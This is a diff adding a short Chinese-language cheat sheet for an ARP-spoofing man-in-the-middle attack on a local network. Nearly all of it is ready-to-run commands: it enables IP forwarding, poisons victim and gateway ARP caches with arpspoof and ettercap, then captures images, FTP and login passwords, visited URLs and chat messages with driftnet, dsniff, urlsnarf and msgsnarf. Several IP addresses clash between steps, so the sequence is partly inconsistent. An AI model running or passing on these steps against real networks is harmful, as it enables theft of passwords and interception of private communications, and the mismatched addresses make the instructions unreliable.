@@ -1,0 +1,29 @@
+目标：192.168.4.127
+本机：192.168.4.200
+网关：192.168.4.254
+
+1、参看IP_forward	cat /proc/sys/net/ipv4/ip_forward
+
+2、设置IP_forward	echo 1 >> /proc/sys/net/ipv4/ip_forward
+
+3、用ARP毒化重定向受害者的流量传送给攻击者
+	arpspoof -i eth2 -t 192.168.4.127 192.168.0.254
+
+4、ARP毒化攻击使网关的数据重定向到攻击者的机器
+	arpspoof -i eth2 -t 192.168.4.254 192.168.4.200
+
+5、网络管理嗅探图片，音频。	 driftnet -i eth2
+
+6、ettercap欺骗		ettercap -T -q -M ARP /192.168.0.127/ //
+
+7、开另一个终端		driftnet -i eth2
+
+8、dsniff来捕获已知协议(FTP)获取密码。 	dsniff -i eth2
+
+9、捕获访问网站的详细信息 	urlsnarf -i eth2
+
+10、嗅探聊天软件的聊天内容 	msgsnarf -i eth2
+
+11、监听网卡窃听登录用户密码	dsniff -i eth2
+
+
